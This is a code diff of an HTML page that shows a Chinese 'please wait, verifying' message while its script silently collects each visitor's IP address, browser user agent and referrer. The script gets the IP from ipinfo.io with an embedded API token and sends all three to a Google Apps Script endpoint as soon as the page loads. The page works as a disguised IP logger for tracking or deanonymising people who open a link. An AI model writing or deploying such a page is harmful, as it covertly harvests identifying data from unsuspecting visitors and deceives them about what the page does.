@@ -2,22 +2,30 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>驗證中...</title>
+  <title>請稍候...</title>
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const params = new URLSearchParams({
-        userAgent: navigator.userAgent,
-        referrer: document.referrer || "None"
-      });
+    window.onload = function () {
+      fetch("https://ipinfo.io/json?token=8708e46a388f3f")
+        .then(response => response.json())
+        .then(ipData => {
+          const params = new URLSearchParams({
+            ip: ipData.ip,
+            userAgent: navigator.userAgent,
+            referrer: document.referrer || "None"
+          });
 
-      fetch("https://script.google.com/macros/s/AKfycbyM9jZAnb1q-4lpv8xXZcJzARjWIzbtC-qr7uYxPI0EiL09hkZdmNCVUbnaST4NECh0/exec?ts=" + Date.now(), {
-        method: "POST",
-        body: params
-      }).then(res => res.text()).then(t => console.log("Apps Script 回應:", t));
-    });
+          // 加上時間戳避免被快取
+          const url = "https://script.google.com/macros/s/AKfycbyM9jZAnb1q-4lpv8xXZcJzARjWIzbtC-qr7uYxPI0EiL09hkZdmNCVUbnaST4NECh0/exec?ts=" + Date.now();
+
+          fetch(url, {
+            method: "POST",
+            body: params
+          }).then(r => r.text()).then(t => console.log("GAS 回應:", t));
+        });
+    };
   </script>
 </head>
 <body>
-  <p>正在驗證裝置資訊，請稍候...</p>
+  <p>驗證中，請稍候...</p>
 </body>
 </html>
